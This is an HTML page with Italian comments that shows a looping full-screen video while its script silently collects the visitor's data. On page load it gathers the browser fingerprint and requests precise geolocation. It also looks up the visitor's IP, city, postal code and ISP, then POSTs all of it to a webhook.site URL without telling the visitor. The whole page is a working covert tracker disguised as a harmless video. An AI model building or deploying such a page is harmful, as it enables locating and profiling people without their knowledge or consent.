<!DOCTYPE html>
<html lang="it">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>hello :)</title>
  <style>
    body {
      margin: 0;
      overflow: hidden;
      background-color: black;
    }
    video {
      position: fixed;
      top: 0; left: 0;
      width: 100%;
      height: 100%;
      object-fit: cover;
    }
  </style>
</head>
<body>
  <video autoplay loop muted playsinline>
    <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
    Il tuo browser non supporta i video HTML5.
  </video>

  <script>
    async function collectData() {
      const data = {
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        cookiesEnabled: navigator.cookieEnabled,
        screen: {
          width: screen.width,
          height: screen.height,
          availWidth: screen.availWidth,
          availHeight: screen.availHeight,
          colorDepth: screen.colorDepth,
        },
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        timestamp: new Date().toISOString(),
        location: {
          latitude: null,
          longitude: null,
          accuracy: null,
        },
        ipInfo: {
          ip: null,
          city: null,
          region: null,
          country: null,
          postal: null,
          org: null,
        }
      };

      // Geolocalizzazione browser (chiede permesso)
      if (navigator.geolocation) {
        try {
          const pos = await new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject, {timeout: 5000});
          });
          data.location.latitude = pos.coords.latitude;
          data.location.longitude = pos.coords.longitude;
          data.location.accuracy = pos.coords.accuracy;
        } catch (err) {
          console.warn("Geolocalizzazione non consentita o fallita:", err.message);
        }
      }

      // Informazioni IP e localitÃ  da servizio pubblico
      try {
        const ipApiRes = await fetch('https://ipapi.co/json/');
        if (ipApiRes.ok) {
          const ipInfo = await ipApiRes.json();
          data.ipInfo.ip = ipInfo.ip;
          data.ipInfo.city = ipInfo.city;
          data.ipInfo.region = ipInfo.region;
          data.ipInfo.country = ipInfo.country_name;
          data.ipInfo.postal = ipInfo.postal;
          data.ipInfo.org = ipInfo.org;
        } else {
          console.warn("Errore risposta ipapi:", ipApiRes.status);
        }
      } catch (e) {
        console.warn("Errore fetch ipapi:", e.message);
      }

      console.log("Dati raccolti:", data);

      // INVIA dati al webhook (sostituisci con il tuo URL base corretto!)
      fetch('https://webhook.site/a7e36058-c9a9-4f83-9740-7f2cc820609a', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
      })
      .then(() => console.log(" Dati inviati con successo"))
      .catch(err => console.error("Errore invio dati:", err));
    }

    collectData();
  </script>
</body>
</html>
